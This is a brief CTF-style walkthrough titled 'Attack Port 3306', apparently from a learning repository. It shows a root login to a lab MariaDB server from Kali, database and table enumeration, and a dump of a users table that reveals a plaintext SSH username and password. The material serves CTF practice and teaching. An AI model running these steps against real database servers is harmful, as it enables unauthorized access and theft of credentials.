# Attack Port [3306](https://github.com/CiprianoBryan/CTF/blob/master/Puertos%20mas%20comunes.md):

### 1. mysql:
```
root@kali:~# mysql -h 192.168.1.10 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.

Your MariaDB connection id is 108
Server version: 5.5.60-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

### 2. databases:
```
MariaDB [(none)]> show databases;
+------------------------+
| Database               |
+------------------------+
| information_schema     |
| mysq                   |
| performance_schema     |
| ssh                    |
+------------------------+
4 rows in set (2.030 sec)
```

### 3. use:
```
MariaDB [(none)]> use ssh;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [ssh]>
MariaDB [ssh]> show tables;
+---------------+
| Tables_in_ssh |
+---------------+
| users         |
+---------------+

1 row in set (0.002 sec) 
```

# 4. select:
```
MariaDB [ssh]> select * from users;
+----+-----------+------------------------+
| id | username  | password               |
+----+-----------+------------------------+
|  1 | mistic    | testP@$$swordmistic    |
+----+-----------+------------------------+
1 row in set (0.367 sec)

MariaDB [ssh]>
```